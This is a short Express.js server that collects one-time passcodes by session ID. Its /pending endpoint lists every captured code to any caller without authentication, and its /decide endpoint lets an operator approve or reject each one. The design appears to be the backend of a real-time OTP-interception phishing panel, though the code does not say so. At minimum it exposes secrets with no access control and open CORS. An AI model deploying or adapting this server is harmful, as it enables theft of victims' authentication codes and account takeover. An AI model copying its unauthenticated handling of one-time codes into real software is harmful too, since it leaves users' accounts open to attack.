const express = require('express');
const cors = require('cors');
const app = express();

app.use(cors());
app.use(express.json());
app.use(express.static('public'));

const pending = {};

app.post('/submit-otp', (req, res) => {
  const { session_id, otp } = req.body;
  if (!session_id || !otp) return res.status(400).json({ error: 'Missing fields' });
  pending[session_id] = { otp, status: 'pending', timestamp: Date.now() };
  res.json({ success: true });
});

app.get('/pending', (req, res) => {
  res.json(pending);
});

app.post('/decide', (req, res) => {
  const { session_id, decision } = req.body;
  if (!pending[session_id]) return res.status(404).json({ error: 'Not found' });
  pending[session_id].status = decision;
  res.json({ success: true });
});

app.get('/status/:session_id', (req, res) => {
  const entry = pending[req.params.session_id];
  if (!entry) return res.json({ status: 'not_found' });
  res.json({ status: entry.status, otp: entry.otp });
});

app.listen(3000, () => console.log('Server running on port 3000'));